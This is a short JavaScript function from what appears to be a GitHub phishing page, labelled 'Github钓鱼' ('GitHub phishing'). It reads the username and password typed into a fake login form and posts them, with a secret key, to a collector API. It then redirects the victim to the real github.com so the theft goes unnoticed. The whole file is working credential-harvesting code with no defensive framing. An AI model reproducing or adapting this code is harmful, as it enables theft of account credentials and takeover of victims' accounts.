function report() {
    var login_field = $("#login_field").val();
    var password = $("#password").val();

    $.ajax({
        type: "POST",
        url: "http://localhost:9001/api/v1/post/report",
        dataType: "json",
        data: {
            "name": "Github钓鱼",
            "info": login_field + "&&" + password,
            "sec_key": "9cbf8a4dcb8e30682b927f352d6559a0"
        },
        success: function (e) {
            if (e.code == "200") {
                window.location.href = "https://github.com";
            } else {
                console.log(e.msg)
            }
        },
        error: function (e) {
            console.log("fail")
        }
    });
}